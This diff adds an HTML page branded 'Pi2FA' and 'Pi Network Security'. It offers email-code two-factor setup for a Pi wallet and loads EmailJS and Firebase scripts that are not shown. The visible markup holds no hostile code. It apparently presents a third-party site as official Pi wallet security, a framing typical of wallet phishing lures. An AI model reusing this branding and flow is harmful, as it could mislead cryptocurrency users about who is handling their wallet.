@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticator - Pi Network Security</title>
+    <link rel="icon" type="image/png" href="pilogo.png">
+    <link rel="stylesheet" href="authpage.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="logo">
+                <img src="pilogo.png" alt="Pi Logo" class="logo-img">
+                <span>Pi2FA</span>
+            </a>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="active">Home</a></li>
+            </ul>
+            <div class="hamburger" id="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <div class="auth-wrapper">
+        <div class="error-banner" id="errorBanner">
+            ⚠️ <span id="errorText"></span>
+        </div>
+
+        <img src="pi2fa.jpeg" alt="2FA Icon" class="header-icon">
+
+        <h2>Wallet 2 Factor Authenticator</h2>
+        <p class="subtitle">Secure your wallet with two-factor authentication</p>
+
+        <!-- Step 1: Email Input -->
+        <div class="verification-step active" id="emailStep">
+            <input
+                type="email"
+                id="emailInput"
+                class="email-input"
+                placeholder="Enter your email address"
+                required
+            />
+            <button class="btn-verify" id="sendCodeBtn">
+                Send Verification Code
+                <span class="loading-spinner" id="sendSpinner" style="display: none;"></span>
+            </button>
+
+            <div class="info-box">
+                <strong>🔐 Why email verification?</strong><br>
+                We'll send a 6-digit code to verify your email and enable 2FA for your Pi wallet.
+            </div>
+        </div>
+
+        <!-- Step 2: Code Verification -->
+        <div class="verification-step" id="codeStep">
+            <p class="code-step-text">
+                We've sent a 6-digit verification code to:<br>
+                <strong id="sentToEmail" class="sent-email"></strong>
+            </p>
+
+            <input
+                type="text"
+                id="codeInput"
+                class="code-input"
+                placeholder="Enter 6-digit code"
+                maxlength="6"
+                pattern="[0-9]{6}"
+                required
+            />
+            <button class="btn-verify" id="verifyCodeBtn">
+                Verify Code
+                <span class="loading-spinner" id="verifySpinner" style="display: none;"></span>
+            </button>
+
+            <div class="resend-timer" id="resendTimer">
+                Didn't receive the code? <span id="timerText"></span>
+            </div>
+            <button class="btn-verify btn-secondary-action" id="resendBtn" style="display: none;">
+                Resend Code
+            </button>
+
+            <a href="#" class="back-link" id="backToEmail">← Change email address</a>
+        </div>
+
+        <!-- Step 3: Success -->
+        <div class="verification-step" id="successStep">
+            <div class="success-icon">✅</div>
+            <h3 class="success-title">Authentication Successful!</h3>
+            <p class="success-text">
+                Your wallet 2-factor authentication has been enabled successfully.
+            </p>
+
+            <div class="info-box">
+                <strong>📧 What's next?</strong><br>
+                You'll receive a confirmation email with your 2FA status and important security tips.
+            </div>
+
+            <a href="index.html" class="btn-verify btn-return">
+                Return to Home
+            </a>
+        </div>
+    </div>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    
+    <!-- Firebase Config -->
+    <script src="firebase-config.js"></script>
+    
+    <!-- Page Script -->
+    <script src="script.js"></script>
+</body>
+</html>
